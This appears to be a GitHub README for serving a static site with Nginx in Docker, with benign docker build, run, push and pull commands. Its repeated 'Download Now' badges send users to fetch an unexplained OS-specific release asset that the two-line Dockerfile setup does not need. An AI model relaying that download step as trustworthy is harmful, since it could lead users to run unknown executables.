# 🖥️ nginx-static-website-docker - Easily Launch Static Websites with Docker

## 🌐 Overview
This project allows you to deploy a static website using Nginx inside a Docker container. It simplifies the process of building a custom Docker image, running containers, and managing your static site. With this tool, you can host your HTML files easily and have them accessible from anywhere.

## 🚀 Getting Started
Follow these simple steps to get your static website up and running.

### 📥 Download the Application
To get started, visit the Releases page to download the application.

[![Download nginx-static-website-docker](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Da-Boys/nginx-static-website-docker/releases)

## 🛠️ System Requirements
- Operating System: Windows, macOS, or Linux
- Docker: Version 20 or later
- Internet connection for downloading Docker and dependencies

## 📂 Download & Install
1. Go to the [Releases page](https://github.com/Da-Boys/nginx-static-website-docker/releases).
2. Look for the latest version listed at the top.
3. Click on the asset that matches your operating system for download.
4. Save the file on your computer.

## ⚙️ Build Your Docker Image
After installing Docker, you may want to build your own Docker image. Here’s how:

1. Open a terminal on your computer.
2. Navigate to the folder where you have saved your website files.
3. Create a file named `Dockerfile` with the following contents:

    ```dockerfile
    FROM nginx:alpine
    COPY . /usr/share/nginx/html
    ```

4. Build the Docker image by running:

    ```bash
    docker build -t my-static-site .
    ```

In this command, replace `my-static-site` with your desired image name.

## 🏃‍♂️ Run Your Container
To run your website, you will need to start a container from your newly built image. Follow these steps:

1. Use the following command to run your container:

    ```bash
    docker run -d -p 8080:80 my-static-site
    ```

2. The website will now be accessible at `http://localhost:8080`.

## 💡 Pushing to Docker Hub
If you want to share your Docker image with others, you can push it to Docker Hub.

1. Log in to your Docker Hub account:

    ```bash
    docker login
    ```

2. Tag your image to prepare it for upload:

    ```bash
    docker tag my-static-site your-dockerhub-username/my-static-site
    ```

3. Finally, push your image:

    ```bash
    docker push your-dockerhub-username/my-static-site
    ```

## 🔄 Pulling Back the Image for Reuse
If you want to use your image on a different machine, you can pull the image from Docker Hub.

1. Run the following command to pull your image:

    ```bash
    docker pull your-dockerhub-username/my-static-site
    ```

2. After pulling, you can run the image like before:

    ```bash
    docker run -d -p 8080:80 your-dockerhub-username/my-static-site
    ```

## 📚 Additional Resources
- **Nginx Documentation**: For more details about Nginx, visit [nginx.org](https://nginx.org).
- **Docker Documentation**: Learn more about Docker at [docs.docker.com](https://docs.docker.com).

## 📞 Support
If you have any questions or issues while using this software, feel free to open an issue on our [GitHub page](https://github.com/Da-Boys/nginx-static-website-docker/issues).

## 💖 Contribute
Feel free to contribute to this project! Open a pull request or submit an issue if you have ideas for improvements or new features.

[![Download nginx-static-website-docker](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Da-Boys/nginx-static-website-docker/releases)